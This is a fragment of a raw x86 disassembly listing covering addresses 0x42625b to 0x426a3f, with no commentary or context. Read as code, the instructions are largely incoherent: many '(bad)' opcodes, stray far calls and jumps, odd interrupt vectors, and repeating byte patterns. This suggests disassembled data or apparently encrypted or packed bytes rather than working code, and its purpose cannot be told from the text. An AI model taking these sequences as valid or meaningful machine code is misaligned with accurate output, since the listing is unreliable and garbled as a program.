  42625b:	(bad)  
  42625c:	stc    
  42625d:	jno    0x4262cf
  42625f:	cwde   
  426260:	add    dh,dl
  426262:	sbb    al,0xcf
  426264:	jbe    0x42621b
  426266:	add    dh,dl
  426268:	mov    BYTE PTR [eax],al
  42626a:	(bad)  
  42626b:	cmc    
  42626c:	add    dh,dl
  42626e:	adc    DWORD PTR [eax],eax
  426270:	(bad)  
  426271:	in     eax,dx
  426272:	jo     0x426243
  426274:	jbe    0x426273
  426276:	jo     0x426235
  426278:	stos   BYTE PTR es:[edi],al
  426279:	clc    
  42627a:	add    BYTE PTR [eax],al
  42627c:	or     dh,BYTE PTR [esi+0x1c]
  42627f:	int    0x76
  426281:	sbb    al,0xcd
  426283:	lea    esp,[edx+ecx*1]
  426286:	outs   dx,BYTE PTR ds:[esi]
  426287:	adc    al,0xcd
  426289:	jbe    0x4262af
  42628b:	leave  
  42628c:	add    BYTE PTR [edi-0x327f7f80],0x76
  426293:	lods   eax,DWORD PTR ds:[esi]
  426294:	int    0x8d
  426296:	and    al,0xa
  426298:	outs   dx,BYTE PTR ds:[esi]
  426299:	test   ch,cl
  42629b:	jbe    0x4262cd
  42629d:	int    0x8d
  42629f:	and    al,0xa
  4262a1:	outs   dx,BYTE PTR ds:[esi]
  4262a2:	mov    ch,cl
  4262a4:	jbe    0x4262ba
  4262a6:	int    0x8d
  4262a8:	and    al,0xa
  4262aa:	outs   dx,BYTE PTR ds:[esi]
  4262ab:	dec    esp
  4262ac:	int    0x76
  4262ae:	and    al,0xc9
  4262b0:	ins    BYTE PTR es:[edi],dx
  4262b1:	and    al,0x81
  4262b3:	add    BYTE PTR [eax-0x32e11380],0x76
  4262ba:	sbb    al,0xcd
  4262bc:	lea    ebx,[ecx*8-0x7f7ed2ff]
  4262c3:	or     ch,0xa
  4262c6:	and    eax,0xcd808081
  4262cb:	xor    BYTE PTR [ebx],0x81
  4262ce:	or     dh,BYTE PTR [esi-0x3]
  4262d1:	int    0x76
  4262d3:	std    
  4262d4:	stos   BYTE PTR es:[edi],al
  4262d5:	test   al,0x63
  4262d7:	retf   
  4262d8:	rcr    BYTE PTR [eax+eax*4],cl
  4262db:	xchg   esi,eax
  4262dc:	int    0xed
  4262de:	int    0x76
  4262e0:	dec    esp
  4262e1:	adc    ch,ch
  4262e3:	cmp    eax,0x5b808081
  4262e8:	cwde   
  4262e9:	call   0x2f35:0x86214966
  4262f0:	push   es
  4262f1:	mov    ecx,0xcd80804a
  4262f6:	jbe    0x426328
  4262f8:	inc    cx
  4262fa:	and    DWORD PTR [esi-0x62f9d0cb],eax
  426300:	dec    edx
  426301:	add    BYTE PTR [eax-0x29128937],0x37
  426308:	ficom  WORD PTR [ebx]
  42630a:	pop    ebp
  42630b:	mov    ebp,0xa25230a
  426310:	jbe    0x426323
  426312:	leave  
  426313:	jbe    0x4262ca
  426315:	xchg   ecx,eax
  426316:	aaa    
  426317:	ficom  WORD PTR [ebx]
  426319:	or     dh,BYTE PTR [esi-0x43]
  42631c:	int    0x76
  42631e:	mov    BYTE PTR [edx],cl
  426320:	jbe    0x426317
  426322:	int    0x76
  426324:	cmc    
  426325:	int    0x1
  426327:	mov    ebp,0xcd808081
  42632c:	or     ch,0x80
  42632f:	or     dh,BYTE PTR [esi-0x7]
  426332:	pop    edi
  426333:	jle    0x42636a
  426335:	add    BYTE PTR [eax-0x7fca69a3],0x80
  42633c:	mov    eax,0x4b0760a
  426341:	ins    DWORD PTR es:[edi],dx
  426342:	(bad)  
  426343:	mov    eax,0xcda2760a
  426348:	sar    DWORD PTR [eax+0x5d15760a],cl
  42634e:	(bad)  
  42634f:	xor    eax,0xf1cd8080
  426354:	mov    eax,0xcf19960a
  426359:	nop
  42635a:	xchg   edx,eax
  42635b:	iret   
  42635c:	sahf   
  42635d:	(bad)  
  42635e:	int    0x99
  426360:	mov    eax,0xcd1d960a
  426365:	aad    0xb8
  426367:	or     dl,BYTE PTR [esi-0x662dfbdf]
  42636d:	mov    eax,0xcf01960a
  426372:	jno    0x4263c8
  426374:	int    0x3
  426376:	mov    eax,0x40be60a
  42637b:	leave  
  42637c:	xchg   ebp,eax
  42637d:	mov    eax,0xcf05e60a
  426382:	ficomp WORD PTR [eax-0x48]
  426385:	or     ah,dh
  426387:	pop    es
  426388:	mov    eax,0xb809760a
  42638d:	or     dl,dh
  42638f:	retf   0xc5cd
  426392:	mov    eax,0xb8cc760a
  426397:	or     dl,BYTE PTR [edi]
  426399:	ins    BYTE PTR es:[edi],dx
  42639a:	add    BYTE PTR [eax],al
  42639c:	add    BYTE PTR [ebp*2+0x60ab8d0],al
  4263a3:	push   edx
  4263a4:	add    BYTE PTR [eax],al
  4263a6:	add    bh,cl
  4263a8:	outs   dx,BYTE PTR ds:[esi]
  4263a9:	add    edi,DWORD PTR [eax+0x74060a]
  4263af:	add    BYTE PTR [eax],al
  4263b1:	add    al,0x6d
  4263b3:	inc    edx
  4263b4:	mov    eax,0x78060a
  4263b9:	add    BYTE PTR [eax],al
  4263bb:	iret   
  4263bc:	outs   dx,BYTE PTR ds:[esi]
  4263bd:	xor    BYTE PTR [eax+0x7c060a],bh
  4263c3:	add    BYTE PTR [eax],al
  4263c5:	add    al,0x6d
  4263c7:	xor    bh,BYTE PTR [eax+0x8a060a]
  4263cd:	add    BYTE PTR [eax],al
  4263cf:	mov    eax,0x8ccf0a
  4263d4:	add    BYTE PTR [eax],al
  4263d6:	int    0xc5
  4263d8:	mov    eax,0x8e060a
  4263dd:	add    BYTE PTR [eax],al
  4263df:	int    0x76
  4263e1:	in     eax,dx
  4263e2:	int    0x8d
  4263e4:	adc    DWORD PTR [edi],ebp
  4263e6:	inc    ebp
  4263e7:	jge    0x42637b
  4263e9:	shr    ebx,cl
  4263eb:	xchg   edx,eax
  4263ec:	int    0x8d
  4263ee:	in     eax,dx
  4263ef:	int    0x96
  4263f1:	adc    ebx,eax
  4263f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263f4:	mov    esi,0xc93b4229
  4263f9:	cmp    ebx,edx
  4263fb:	shl    edx,cl
  4263fd:	sub    BYTE PTR [ebx-0x2e],dl
  426400:	in     al,dx
  426401:	outs   dx,BYTE PTR ds:[esi]
  426402:	iret   
  426403:	aam    0x76
  426405:	mov    al,0xb8
  426407:	int    0x4e
  426409:	das    
  42640a:	mov    ebx,0xcbbb2f18
  42640f:	cmp    ecx,DWORD PTR [edx+edx*1]
  426412:	sti    
  426413:	and    DWORD PTR ds:0xf3e38080,esi
  426419:	shl    edx,cl
  42641b:	das    
  42641c:	push   ebx
  42641d:	adc    ecx,DWORD PTR [ecx]
  42641f:	int3   
  426420:	test   DWORD PTR [ebp-0x32ffff01],esp
  426426:	lea    esi,[ebp+0x2fbd96cd]
  42642c:	inc    ebp
  42642d:	jecxz  0x4263c1
  42642f:	shl    ebx,cl
  426431:	xchg   edx,eax
  426432:	int    0x96
  426434:	mov    ch,0xcd
  426436:	(bad)  
  426437:	mov    ebp,0xf73bf03b
  42643c:	push   ebx
  42643d:	psrlq  mm5,mm2
  426440:	sub    BYTE PTR [edi-0x7906fb2d],al
  426446:	(bad)  
  426447:	popa   
  426448:	int    0x76
  42644a:	in     eax,dx
  42644b:	int    0x8d
  42644d:	adc    DWORD PTR [edi],ebp
  42644f:	inc    ebp
  426450:	jge    0x4263e4
  426452:	shr    ebx,cl
  426454:	xchg   edx,eax
  426455:	int    0x8d
  426457:	in     eax,dx
  426458:	int    0x96
  42645a:	adc    DWORD PTR [ebx],edi
  42645c:	leave  
  42645d:	cmp    ebx,edx
  42645f:	shl    edx,cl
  426461:	sub    BYTE PTR [ebx-0x2e],dl
  426464:	in     al,dx
  426465:	outs   dx,BYTE PTR ds:[esi]
  426466:	iret   
  426467:	aam    0x76
  426469:	add    DWORD PTR [eax-0x44d0b133],edi
  42646f:	sbb    BYTE PTR [edi],ch
  426471:	mov    ebx,0x120c3bcb
  426476:	sti    
  426477:	and    DWORD PTR ds:0xf3e38080,esi
  42647d:	shl    edx,cl
  42647f:	das    
  426480:	push   ebx
  426481:	adc    ecx,DWORD PTR [ecx]
  426483:	int3   
  426484:	test   esp,ecx
  426486:	inc    DWORD PTR [eax]
  426488:	add    ch,cl
  42648a:	lea    esi,[ebp+0x2fbd96cd]
  426490:	inc    ebp
  426491:	jecxz  0x426425
  426493:	shl    ebx,cl
  426495:	xchg   edx,eax
  426496:	int    0x96
  426498:	mov    ch,0xcd
  42649a:	(bad)  
  42649b:	mov    ebp,0xf73bf03b
  4264a0:	push   ebx
  4264a1:	psrlq  mm5,mm2
  4264a4:	sub    BYTE PTR [edi-0x7406fb2d],al
  4264aa:	(bad)  
  4264ab:	popa   
  4264ac:	int    0x76
  4264ae:	in     eax,dx
  4264af:	int    0x8d
  4264b1:	adc    DWORD PTR [edi],ebp
  4264b3:	inc    ebp
  4264b4:	jge    0x426448
  4264b6:	shr    ebx,cl
  4264b8:	xchg   edx,eax
  4264b9:	int    0x8d
  4264bb:	in     eax,dx
  4264bc:	int    0x96
  4264be:	adc    DWORD PTR [ebx],edi
  4264c0:	leave  
  4264c1:	cmp    ebx,edx
  4264c3:	shl    edx,cl
  4264c5:	sub    BYTE PTR [ebx-0x2e],dl
  4264c8:	in     al,dx
  4264c9:	je     0x42649a
  4264cb:	push   ebp
  4264cc:	jbe    0x42653a
  4264ce:	add    BYTE PTR [eax],al
  4264d0:	add    BYTE PTR [eax-0x44d0b133],bh
  4264d6:	sbb    BYTE PTR [edi],ch
  4264d8:	mov    ebx,0x120c3bcb
  4264dd:	sti    
  4264de:	and    DWORD PTR ds:0xf3e38080,esi
  4264e4:	shl    edx,cl
  4264e6:	das    
  4264e7:	push   ebx
  4264e8:	adc    ecx,DWORD PTR [ecx]
  4264ea:	int3   
  4264eb:	test   DWORD PTR ds:0xcd0000ff,eax
  4264f1:	lea    esi,[ebp+0x2fbd96cd]
  4264f7:	inc    ebp
  4264f8:	jecxz  0x42648c
  4264fa:	shl    ebx,cl
  4264fc:	xchg   edx,eax
  4264fd:	int    0x96
  4264ff:	mov    ch,0xcd
  426501:	(bad)  
  426502:	mov    ebp,0xf73bf03b
  426507:	push   ebx
  426508:	psrlq  mm5,mm2
  42650b:	sub    BYTE PTR [edi-0x7706fb2d],al
  426511:	(bad)  
  426512:	mov    ebx,0xffb506cf
  426517:	add    BYTE PTR [eax],al
  426519:	or     dh,BYTE PTR [esi-0x7]
  42651c:	int    0x76
  42651e:	stc    
  42651f:	pop    edi
  426520:	inc    esi
  426521:	pop    esp
  426522:	inc    ebp
  426523:	xchg   edi,eax
  426524:	or     cl,BYTE PTR [eax+0x79245161]
  42652a:	daa    
  42652b:	or     dh,BYTE PTR [eax-0x7c]
  42652e:	int    0x6
  426530:	mov    ch,0xff
  426532:	add    BYTE PTR [eax],al
  426534:	int    0x57
  426536:	mov    ebp,0xa0000ff
  42653b:	(bad)  
  42653c:	mov    ebp,0x8621d169
  426541:	xor    eax,0x62fd343
  426546:	pusha  
  426547:	add    DWORD PTR [eax-0x4269a180],0x8151062f
  426551:	add    BYTE PTR [eax-0x7fca76a3],0x80
  426558:	mov    eax,0xfff9060a
  42655d:	add    BYTE PTR [eax],al
  42655f:	int    0xc5
  426561:	mov    eax,0xff03060a
  426566:	add    BYTE PTR [eax],al
  426568:	pop    ebp
  426569:	es xor eax,0xab88080
  42656f:	push   es
  426570:	std    
  426571:	inc    DWORD PTR [eax]
  426573:	add    BYTE PTR [ebp-0x5d],bl
  426576:	xor    eax,0xab88080
  42657b:	push   es
  42657c:	(bad)  
  42657d:	inc    DWORD PTR [eax]
  42657f:	add    BYTE PTR [ebp+0x1e],bl
  426582:	xor    eax,0xab88080
  426587:	push   es
  426588:	add    BYTE PTR [eax],0x0
  42658b:	add    BYTE PTR [ebp*2-0x47823218],al
  426592:	or     cl,bh
  426594:	xchg   edx,eax
  426595:	add    BYTE PTR [eax],al
  426597:	add    ch,cl
  426599:	jbe    0x4265cb
  42659b:	pop    edi
  42659c:	dec    ebx
  42659d:	xor    eax,0xab88080
  4265a2:	iret   
  4265a3:	test   BYTE PTR [eax],al
  4265a5:	add    BYTE PTR [eax],al
  4265a7:	add    al,0xd3
  4265a9:	bound  edi,QWORD PTR [eax+0x86cf0a]
  4265af:	add    BYTE PTR [eax],al
  4265b1:	pop    edi
  4265b2:	push   esi
  4265b3:	xor    eax,0xab88080
  4265b8:	iret   
  4265b9:	mov    BYTE PTR [eax],al
  4265bb:	add    BYTE PTR [eax],al
  4265bd:	add    al,0xd3
  4265bf:	pushf  
  4265c0:	mov    eax,0x4acf0a
  4265c5:	add    BYTE PTR [eax],al
  4265c7:	int    0xc
  4265c9:	mov    eax,0x4ccf0a
  4265ce:	add    BYTE PTR [eax],al
  4265d0:	pop    edi
  4265d1:	add    al,0x35
  4265d3:	add    BYTE PTR [eax+0x4ecf0ab8],0x0
  4265da:	add    BYTE PTR [eax],al
  4265dc:	cmp    edi,DWORD PTR [ecx+0x5f]
  4265df:	adc    DWORD PTR [eax-0x80],edx
  4265e2:	cmp    BYTE PTR [eax+0x30cf0a],0x0
  4265e9:	add    bl,dl
  4265eb:	mov    ebp,0x151a5f92
  4265f0:	add    BYTE PTR [eax+0x22cf0ab8],0x0
  4265f7:	add    BYTE PTR [eax],al
  4265f9:	pop    edi
  4265fa:	call   0xcf0a:0xb88080eb
  426601:	adc    al,0x0
  426603:	add    BYTE PTR [eax],al
  426605:	int    0x8d
  426607:	xor    BYTE PTR [edx+eax*1],al
  42660a:	call   ebx
  42660c:	repnz sub BYTE PTR [ebx-0x2d],dl
  426610:	or     al,BYTE PTR [esi]
  426612:	adc    eax,0xcd0000ff
  426617:	jbe    0x426665
  426619:	int    0x8d
  42661b:	dec    esp
  42661c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42661f:	mov    ebp,0xff020492
  426624:	shl    edx,cl
  426626:	sub    BYTE PTR [ebx-0x2d],dl
  426629:	leave  
  42662a:	add    eax,0xff1d06
  42662f:	add    BYTE PTR [eax],al
  426631:	add    BYTE PTR [eax+0x1506cf80],al
  426637:	inc    DWORD PTR [eax]
  426639:	add    BYTE PTR [eax-0x33],dh
  42663c:	jbe    0x42666e
  42663e:	int    0x8d
  426640:	xor    BYTE PTR [ebx],bh
  426642:	jns    0x426617
  426644:	mov    ebp,0xff020492
  426649:	shl    edx,cl
  42664b:	sub    BYTE PTR [ebx-0x2d],dl
  42664e:	jo     0x42661f
  426650:	push   es
  426651:	stc    
  426652:	inc    DWORD PTR [eax]
  426654:	add    BYTE PTR [eax-0x33],dh
  426657:	jbe    0x42664e
  426659:	int    0x1
  42665b:	cmp    eax,0xc9808081
  426660:	push   es
  426661:	sbb    BYTE PTR [eax],al
  426663:	add    BYTE PTR [eax],al
  426665:	inc    eax
  426666:	retf   
  426667:	fwait
  426668:	xor    eax,0x76cd5000
  42666d:	adc    al,0x0
  42666f:	icebp  
  426670:	or     dh,BYTE PTR [esi-0x7]
  426673:	int    0x76
  426675:	stc    
  426676:	push   es
  426677:	ins    DWORD PTR es:[edi],dx
  426678:	aam    0x4a
  42667a:	adc    dl,BYTE PTR [esi+0x68]
  42667d:	or     BYTE PTR [ebx+ecx*1],bl
  426680:	fmul   QWORD PTR [ebx-0x17]
  426683:	(bad)  
  426684:	int    0x8d
  426686:	dec    esp
  426687:	int    0x96
  426689:	dec    esp
  42668a:	sar    bh,0x3b
  42668d:	setl   BYTE PTR [ebx]
  426690:	icebp  
  426691:	shr    edx,cl
  426693:	sub    bl,dl
  426695:	jmp    0x426629
  426697:	push   ebx
  426698:	adc    ecx,ebp
  42669a:	xchg   esi,eax
  42669b:	cmc    
  42669c:	int    0xa2
  42669e:	and    eax,0x5e808081
  4266a3:	dec    edx
  4266a4:	das    
  4266a5:	push   es
  4266a6:	popa   
  4266a7:	test   DWORD PTR [eax+0x4c8dcd80],eax
  4266ad:	int    0x96
  4266af:	dec    esp
  4266b0:	cmp    ecx,DWORD PTR [edi]
  4266b2:	shr    ebx,cl
  4266b4:	xchg   edx,eax
  4266b5:	cmp    esi,ecx
  4266b7:	shr    edx,cl
  4266b9:	sub    BYTE PTR [ebx+0x13],dl
  4266bc:	int    0x96
  4266be:	cmc    
  4266bf:	int    0xa2
  4266c1:	in     al,0x81
  4266c3:	add    BYTE PTR [eax-0x7232b5f6],0x4c
  4266ca:	int    0x96
  4266cc:	dec    esp
  4266cd:	cmp    ecx,DWORD PTR [edi]
  4266cf:	shr    ebx,cl
  4266d1:	xchg   edx,eax
  4266d2:	cmp    esi,ecx
  4266d4:	shr    edx,cl
  4266d6:	sub    BYTE PTR [ebx+0x13],dl
  4266d9:	int    0x96
  4266db:	cmc    
  4266dc:	int    0xa2
  4266de:	add    DWORD PTR [ecx+0x4a0a8080],eax
  4266e4:	pop    edi
  4266e5:	xor    ax,0x8080
  4266e9:	mov    eax,0x24cf0a
  4266ee:	add    BYTE PTR [eax],al
  4266f0:	int    0xc
  4266f2:	mov    eax,0x28cf0a
  4266f7:	add    BYTE PTR [eax],al
  4266f9:	pop    edi
  4266fa:	es xor eax,0xab88080
  426700:	iret   
  426701:	sub    al,0x0
  426703:	add    BYTE PTR [eax],al
  426705:	pop    edi
  426706:	daa    
  426707:	xor    eax,0xab88080
  42670c:	iret   
  42670d:	xor    al,BYTE PTR [eax]
  42670f:	add    BYTE PTR [eax],al
  426711:	add    al,0xd3
  426713:	test   eax,0x34cf0ab8
  426718:	add    BYTE PTR [eax],al
  42671a:	add    BYTE PTR [edi-0x69],bl
  42671d:	xor    eax,0xab88080
  426722:	iret   
  426723:	cmp    BYTE PTR [eax],al
  426725:	add    BYTE PTR [eax],al
  426727:	add    al,0xd3
  426729:	mov    dl,0xb8
  42672b:	or     cl,bh
  42672d:	cmp    al,0x0
  42672f:	add    BYTE PTR [eax],al
  426731:	pop    edi
  426732:	fwait
  426733:	xor    eax,0xab88080
  426738:	iret   
  426739:	inc    eax
  42673a:	add    BYTE PTR [eax],al
  42673c:	add    ch,cl
  42673e:	or     al,0xb8
  426740:	or     cl,bh
  426742:	inc    esp
  426743:	add    BYTE PTR [eax],al
  426745:	add    BYTE PTR [edi+0x17],bl
  426748:	xor    eax,0xab88080
  42674d:	iret   
  42674e:	dec    eax
  42674f:	add    BYTE PTR [eax],al
  426751:	add    BYTE PTR [edi+0x26],bl
  426754:	pop    esi
  426755:	add    BYTE PTR [eax+0x50cf0ab8],0x0
  42675c:	add    BYTE PTR [eax],al
  42675e:	pop    edi
  42675f:	cmp    esi,DWORD PTR [edx]
  426761:	add    BYTE PTR [eax+0x42cf0ab8],0x0
  426768:	add    BYTE PTR [eax],al
  42676a:	jns    0x4267e2
  42676c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42676d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42676e:	pop    edi
  42676f:	pop    esp
  426770:	adc    eax,0xab88080
  426775:	iret   
  426776:	push   esp
  426777:	add    BYTE PTR [eax],al
  426779:	add    BYTE PTR [ebx+edx*8],al
  42677c:	pop    esp
  42677d:	mov    eax,0x58cf0a
  426782:	add    BYTE PTR [eax],al
  426784:	jns    0x4267fc
  426786:	fisttp WORD PTR [ecx+0x79]
  426789:	jbe    0x426734
  42678b:	inc    ecx
  42678c:	jns    0x426804
  42678e:	loope  0x426733
  426790:	pop    edi
  426791:	fcom   st(4)
  426793:	add    BYTE PTR [eax+0x5ccf0ab8],0x0
  42679a:	add    BYTE PTR [eax],al
  42679c:	jns    0x426814
  42679e:	lods   eax,DWORD PTR ds:[esi]
  42679f:	push   edi
  4267a0:	pop    edi
  4267a1:	jnp    0x4267f8
  4267a3:	add    BYTE PTR [eax+0x60cf0ab8],0x0
  4267aa:	add    BYTE PTR [eax],al
  4267ac:	jns    0x426824
  4267ae:	repnz cmp DWORD PTR [ecx+0x76],edi
  4267b2:	jmp    0x8080:0x35a15f47
  4267b9:	mov    eax,0x64cf0a
  4267be:	add    BYTE PTR [eax],al
  4267c0:	jns    0x426838
  4267c2:	in     eax,0x18
  4267c4:	int    0x8d
  4267c6:	xor    ch,cl
  4267c8:	xchg   esi,eax
  4267c9:	xor    BYTE PTR [ebx],bh
  4267cb:	(bad)  
  4267cd:	icebp  
  4267ce:	shr    ebx,cl
  4267d0:	xchg   edx,eax
  4267d1:	shr    edx,cl
  4267d3:	sub    BYTE PTR [ebx+0x13],dl
  4267d6:	in     al,dx
  4267d7:	xchg   esp,eax
  4267d8:	int    0x96
  4267da:	xor    ch,cl
  4267dc:	out    0x30,al
  4267de:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4267e4:	stc    
  4267e5:	shr    ecx,cl
  4267e7:	sub    BYTE PTR [ebx-0x27],dl
  4267ea:	xor    edx,DWORD PTR [ebx]
  4267ec:	das    
  4267ed:	pop    ecx
  4267ee:	mov    WORD PTR [ebp-0x5b],cs
  4267f1:	int    0x96
  4267f3:	xor    ch,cl
  4267f5:	out    0x30,al
  4267f7:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4267fd:	stc    
  4267fe:	shr    ecx,cl
  426800:	sub    BYTE PTR [ebx-0x27],dl
  426803:	int    0xe6
  426805:	stc    
  426806:	add    al,0x2
  426808:	adc    DWORD PTR [edx],0xffffffd3
  42680b:	fwait
  42680c:	add    BYTE PTR [eax+0x9033380],0x8c
  426813:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  426815:	int    0x96
  426817:	xor    ch,cl
  426819:	lea    esi,[eax]
  42681b:	cmp    ebx,DWORD PTR [ecx-0xd2c82c5]
  426821:	sub    bl,dl
  426823:	repz xchg edx,eax
  426825:	push   ebx
  426826:	jecxz  0x4267f5
  426828:	(bad)  
  426829:	stc    
  42682a:	xchg   DWORD PTR [ebx],edx
  42682c:	int    0x96
  42682e:	xor    ch,cl
  426830:	out    0x30,al
  426832:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  426838:	xchg   edx,eax
  426839:	shr    ecx,cl
  42683b:	sub    BYTE PTR [ebx-0x27],dl
  42683e:	add    al,0xd2
  426840:	mov    BYTE PTR [edx],cl
  426842:	(bad)  
  426843:	stc    
  426844:	inc    ebx
  426845:	adc    eax,DWORD PTR [edx+0x308dcdb0]
  42684b:	int    0x96
  42684d:	xor    BYTE PTR [ebx],bh
  42684f:	(bad)  
  426851:	icebp  
  426852:	shr    ebx,cl
  426854:	xchg   edx,eax
  426855:	shr    edx,cl
  426857:	sub    BYTE PTR [ebx+0x13],dl
  42685a:	or     cl,bh
  42685c:	adc    eax,0xcd0000ff
  426861:	lea    ecx,[ebp+ecx*8-0x6a]
  426865:	dec    esp
  426866:	cmp    ecx,DWORD PTR [edi]
  426868:	cmp    esi,ecx
  42686a:	shr    edx,cl
  42686c:	sub    bl,dl
  42686e:	jmp    0x426802
  426870:	push   ebx
  426871:	adc    ecx,edi
  426873:	xchg   esi,eax
  426874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426875:	or     dl,BYTE PTR ds:0xff1dcf
  42687b:	add    BYTE PTR [ecx+0x6b],ah
  42687e:	xor    eax,0x13cd8080
  426883:	mov    eax,0x4258d0a
  426888:	rcl    edx,cl
  42688a:	int    0xfa
  42688c:	mov    eax,0xcf29e60a
  426891:	loopne 0x42683c
  426893:	mov    eax,0x42de60a
  426898:	leave  
  426899:	test   BYTE PTR [eax-0x304d19f6],bh
  42689f:	loopne 0x4268b5
  4268a1:	mov    eax,0x435e60a
  4268a6:	leave  
  4268a7:	loop   0x426861
  4268a9:	or     ah,dh
  4268ab:	cmp    ebp,ecx
  4268ad:	cli    
  4268ae:	mov    eax,0xcd3de60a
  4268b3:	add    edi,DWORD PTR [eax-0x32be19f6]
  4268b9:	cld    
  4268ba:	mov    eax,0xcd45e60a
  4268bf:	add    edi,DWORD PTR [eax-0x322f19f6]
  4268c5:	cli    
  4268c6:	mov    eax,0xcfc2e60a
  4268cb:	loopne 0x4268f6
  4268cd:	mov    eax,0x455e60a
  4268d2:	leave  
  4268d3:	test   BYTE PTR [eax-0x30a619f6],bh
  4268d9:	loopne 0x426870
  4268db:	mov    eax,0x45de60a
  4268e0:	leave  
  4268e1:	loop   0x42689b
  4268e3:	or     ah,dh
  4268e5:	popa   
  4268e6:	mov    eax,0xb8658d0a
  4268eb:	or     dl,BYTE PTR [esi-0x47f33297]
  4268f1:	or     cl,BYTE PTR [ebp+0x4c8dcd6d]
  4268f7:	int    0x96
  4268f9:	dec    esp
  4268fa:	cmp    esi,ecx
  4268fc:	cmp    ecx,DWORD PTR [edi]
  4268fe:	shr    edx,cl
  426900:	sub    bl,dl
  426902:	jmp    0x426896
  426904:	push   ebx
  426905:	adc    ecx,ebp
  426907:	xchg   esi,eax
  426908:	dec    esp
  426909:	int    0xe6
  42690b:	dec    esp
  42690c:	cmp    ebx,DWORD PTR [ecx-0x306d0c2d]
  426912:	mov    WORD PTR [ebp-0x2c06c430],cs
  426918:	jmp    0x301bbc45
  42691d:	mov    ebx,0xb8d93b5e
  426922:	or     dh,BYTE PTR [ecx]
  426924:	int    0x8d
  426926:	dec    esp
  426927:	int    0x96
  426929:	dec    esp
  42692a:	cmp    ecx,DWORD PTR [edi]
  42692c:	cmp    esi,ecx
  42692e:	shr    ebx,cl
  426930:	xchg   edx,eax
  426931:	shr    edx,cl
  426933:	sub    BYTE PTR [ebx+0x13],dl
  426936:	int    0x96
  426938:	dec    esp
  426939:	iret   
  42693a:	mov    WORD PTR [ebp-0x3266c4db],cs
  426940:	out    0x4c,al
  426942:	shl    ebx,cl
  426944:	xchg   edx,eax
  426945:	cmp    edi,ecx
  426947:	shr    ecx,cl
  426949:	sub    BYTE PTR [ebx-0x27],dl
  42694c:	das    
  42694d:	mov    ebx,0xb8d93b5e
  426952:	or     dh,BYTE PTR [ecx]
  426954:	int    0x8d
  426956:	dec    esp
  426957:	int    0x96
  426959:	dec    esp
  42695a:	cmp    esi,ecx
  42695c:	shr    edx,cl
  42695e:	sub    BYTE PTR [ebx],bh
  426960:	psrlq  mm5,mm3
  426963:	xchg   edx,eax
  426964:	push   ebx
  426965:	adc    ecx,ebp
  426967:	xchg   esi,eax
  426968:	dec    esp
  426969:	int    0xe6
  42696b:	dec    esp
  42696c:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426972:	stc    
  426973:	shr    ecx,cl
  426975:	sub    BYTE PTR [ebx-0x27],dl
  426978:	mov    eax,0x9096cc0a
  42697d:	inc    DWORD PTR [eax]
  42697f:	add    ch,cl
  426981:	lea    ecx,[ebp+ecx*8-0x6a]
  426985:	dec    esp
  426986:	cmp    esi,ecx
  426988:	shr    edx,cl
  42698a:	sub    BYTE PTR [ebx],bh
  42698c:	psrlq  mm5,mm3
  42698f:	xchg   edx,eax
  426990:	push   ebx
  426991:	adc    ecx,ebp
  426993:	xchg   esi,eax
  426994:	dec    esp
  426995:	int    0xe6
  426997:	dec    esp
  426998:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42699e:	stc    
  42699f:	shr    ecx,cl
  4269a1:	sub    BYTE PTR [ebx-0x27],dl
  4269a4:	mov    eax,0xa496cc0a
  4269a9:	inc    DWORD PTR [eax]
  4269ab:	add    ch,cl
  4269ad:	lea    esi,[eax]
  4269af:	int    0x96
  4269b1:	xor    BYTE PTR [ebx],bh
  4269b3:	icebp  
  4269b4:	cmp    ecx,DWORD PTR [edi]
  4269b6:	shr    edx,cl
  4269b8:	sub    bl,dl
  4269ba:	jmp    0x42694e
  4269bc:	push   ebx
  4269bd:	adc    ecx,ebp
  4269bf:	xchg   esi,eax
  4269c0:	xor    ch,cl
  4269c2:	out    0x30,al
  4269c4:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  4269ca:	xchg   edx,eax
  4269cb:	shr    ecx,cl
  4269cd:	sub    BYTE PTR [ebx-0x27],dl
  4269d0:	xchg   DWORD PTR [ebx],edx
  4269d2:	or     cl,bh
  4269d4:	adc    eax,0xcd0000ff
  4269d9:	lea    ecx,[ebp+ecx*8-0x6a]
  4269dd:	dec    esp
  4269de:	int    0xe6
  4269e0:	mov    BYTE PTR [ebx],bh
  4269e2:	icebp  
  4269e3:	cmp    ecx,DWORD PTR [edi]
  4269e5:	shr    ebx,cl
  4269e7:	xchg   edx,eax
  4269e8:	shr    edx,cl
  4269ea:	sub    BYTE PTR [ebx+0x13],dl
  4269ed:	iret   
  4269ee:	push   es
  4269ef:	nop
  4269f0:	inc    DWORD PTR [eax]
  4269f2:	add    BYTE PTR [edx],cl
  4269f4:	add    eax,0xff1dcf
  4269f9:	add    bh,cl
  4269fb:	jbe    0x4269cd
  4269fd:	mov    ebp,0x10d8
  426a02:	int    0x8d
  426a04:	xor    ch,cl
  426a06:	xchg   esi,eax
  426a07:	xor    al,al
  426a09:	(bad)  
  426a0a:	cmp    ecx,DWORD PTR [edi]
  426a0c:	stos   BYTE PTR es:[edi],al
  426a0d:	cmp    ebx,ecx
  426a0f:	shr    ebx,cl
  426a11:	xchg   edx,eax
  426a12:	shr    edx,cl
  426a14:	sub    BYTE PTR [ebx+0x13],dl
  426a17:	or     al,BYTE PTR ds:0xff1dcf
  426a1d:	add    ch,cl
  426a1f:	jbe    0x426a6d
  426a21:	int    0x8d
  426a23:	dec    esp
  426a24:	cmp    edi,DWORD PTR [ecx-0x2d]
  426a27:	mov    ebp,0xd3f03b92
  426a2c:	repnz sub BYTE PTR [ebx-0x2d],dl
  426a30:	aam    0x3c
  426a32:	iret   
  426a33:	push   es
  426a34:	adc    eax,0x700000ff
  426a39:	int    0x76
  426a3b:	xor    ch,cl
  426a3d:	lea    esi,[eax]
  426a3f:	cmp    edi,DWORD PTR [ecx-0x2d]
